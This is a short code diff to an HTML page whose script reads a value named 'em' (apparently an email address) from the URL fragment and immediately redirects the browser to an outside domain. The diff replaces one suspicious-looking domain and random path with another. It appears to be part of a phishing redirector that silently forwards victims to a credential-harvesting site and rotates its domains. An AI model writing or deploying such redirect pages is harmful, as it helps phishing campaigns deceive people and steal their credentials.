@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://totallcheck-up.com.br/takauiegb";
+			window.location.href = "https://sersibardari.com/etywiieo";
 		}, 0);
 	</script>
 </html>
